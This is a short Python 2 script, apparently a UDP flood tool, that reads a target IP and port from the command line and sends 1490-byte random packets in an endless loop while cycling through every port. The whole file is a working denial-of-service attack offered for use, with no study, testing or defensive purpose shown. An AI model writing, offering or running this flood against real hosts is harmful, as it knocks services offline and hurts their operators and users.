try:
	import os
	import sys
	import socket
	import optparse
	import random
	from datetime import datetime
except ImportError:
	print "Error bang/sis :("
	
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

try:
	parser = optparse.OptionParser()
	parser.add_option("-i", "--ip", type="string", help="web ip", dest="address")
	parser.add_option("-p", "--port", type="int", help="web port", dest="aport")
	opt, args = parser.parse_args()
	if opt.address:
		a = opt.address
	if opt.aport:
		b = opt.aport
except NameError:
	print "Error bang/sis :("

ip = a
port = b
##########
sent = 0
while True:
	sock.sendto(bytes, (ip,port))
	sent = sent + 1
	port = port + 1
	print "Sent %s packet to %s"%(sent,ip)
	if port == 65534:
		port = 1
##########